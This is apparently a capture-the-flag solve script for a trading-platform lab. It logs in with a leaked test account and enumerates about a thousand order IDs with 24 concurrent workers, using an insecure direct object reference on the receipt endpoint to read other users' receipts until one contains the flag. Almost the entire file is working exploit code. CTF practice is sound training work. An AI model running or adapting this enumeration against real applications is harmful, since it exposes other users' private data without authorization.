"""Trading Platform — Order Receipts (Tsinghua CTFy, xbow instance).

The receipt endpoint authenticates the session but never checks that the
requested order belongs to the logged-in user.  Log in with the leaked test
account, then enumerate nearby order IDs until another user's receipt
contains the flag.

Run from the repository dev shell:

    nix develop
    uv run platform/tsinghua-ctfy/xbow/solve.py

If the instance address differs, pass `--ip` and `--host`.  The default IP
is the real address behind `scdvyr4grj6f3ox7v.internal`; using it avoids the
local Clash fake-IP DNS interception described in ../README.md.
"""

from __future__ import annotations

import argparse
import http.client
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode

DEFAULT_HOST = "scdvyr4grj6f3ox7v.internal"
DEFAULT_IP = "172.16.30.2"


class Client:
    def __init__(self, ip: str, host: str) -> None:
        self.ip = ip
        self.host = host
        self.cookie = ""

    def request(
        self, method: str, path: str, body: bytes | None = None
    ) -> tuple[int, str | None, bytes]:
        headers = {"Host": self.host, "Connection": "close"}
        if self.cookie:
            headers["Cookie"] = self.cookie
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"

        connection = http.client.HTTPConnection(self.ip, 80, timeout=10)
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        data = response.read()
        status = response.status
        location = response.getheader("Location")
        set_cookie = response.getheader("Set-Cookie")
        connection.close()

        if set_cookie and set_cookie.startswith("session="):
            self.cookie = set_cookie.split(";", 1)[0]

        return status, location, data

    def login(self, username: str = "test", password: str = "test") -> str:
        self.request("POST", "/", urlencode({"username": username}).encode())
        status, _, body = self.request("GET", f"/password/{username}")
        if status != 200:
            raise RuntimeError(f"password page returned {status}")

        match = re.search(rb'name="user_id" value="(\d+)"', body)
        if not match:
            raise RuntimeError("could not find the hidden user_id field")
        user_id = match.group(1).decode()

        status, location, _ = self.request(
            "POST",
            f"/password/{username}",
            urlencode(
                {"username": username, "user_id": user_id, "password": password}
            ).encode(),
        )
        if status not in (301, 302) or not self.cookie:
            raise RuntimeError(f"login failed: status={status} location={location}")

        return user_id

    def receipt(self, order_id: int) -> tuple[int, int, bytes]:
        status, _, body = self.request("GET", f"/order/{order_id}/receipt")
        return order_id, status, body


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--ip", default=DEFAULT_IP)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--start", type=int, default=300000)
    parser.add_argument("--end", type=int, default=301000)
    parser.add_argument("--workers", type=int, default=24)
    args = parser.parse_args()

    client = Client(args.ip, args.host)
    user_id = client.login()
    print(f"logged in as test (user_id={user_id})")

    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [
            pool.submit(client.receipt, order_id)
            for order_id in range(args.start, args.end + 1)
        ]
        for future in as_completed(futures):
            order_id, status, body = future.result()
            if status != 200:
                continue
            match = re.search(rb"FLAG\{[^}]+\}", body)
            if match:
                print(f"order {order_id}: {match.group(0).decode()}")
                return

    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
